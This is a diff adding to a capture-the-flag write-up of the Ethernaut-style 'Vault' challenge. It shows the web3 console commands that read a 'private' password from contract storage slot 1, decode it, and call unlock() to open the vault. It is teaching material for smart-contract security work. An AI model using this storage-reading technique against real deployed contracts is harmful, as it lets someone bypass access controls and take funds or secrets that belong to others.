@@ -30,3 +30,34 @@ Challange's message.
 >Unlock the vault to pass the level!
 
 We have an contract which has type of bool variable called **locked** and type of **bytes** variable named **_password_** that defined in constructor(). What is more, there is **unlock()** function which checks _password we entered. If we entered correct password, unlocked will be **false** so we will beat this level.
+
+## Smart Contract's Storage
+
+## Accessing Private Variabes In Storage
+
+
+
+# Subverting
+
+```shell
+await contract.locked()
+true
+```
+
+```shell
+var pass = await web3.eth.getStorageAt(contract.address,1,console.log)
+```
+
+```shell
+await web3.utils.hexToUtf8(pass)
+'A very strong secret password :)'
+```
+```shell
+await contract.unlock(pass)
+```
+```shell
+await contract.locked()
+false
+```
+
+**_by wasnyps_**
